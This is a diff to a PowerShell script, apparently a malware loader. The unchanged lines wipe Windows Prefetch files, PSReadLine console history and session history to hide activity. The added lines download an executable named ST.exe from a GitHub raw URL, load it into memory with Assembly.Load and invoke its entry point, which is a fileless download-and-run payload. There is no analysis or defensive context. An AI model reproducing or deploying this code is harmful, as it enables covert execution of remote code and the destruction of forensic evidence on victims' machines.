@@ -125,7 +125,13 @@ Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction Silently
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-$invokeArgs = New-Object object[] 1
-$invokeArgs[0] = [string[]]@("-start")
-$entry.Invoke($null, $invokeArgs)
+
+$link2 = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe"
+$webClient2 = New-Object System.Net.WebClient
+$bytes2 = $webClient2.DownloadData($link2)
+$assembly2 = [System.Reflection.Assembly]::Load($bytes2)
+$entry2 = $assembly2.EntryPoint
+$invokeArgs2 = New-Object object[] 1 
+$invokeArgs2[0] = [string[]]@() 
+$entry2.Invoke($null, $invokeArgs2)
 Exit
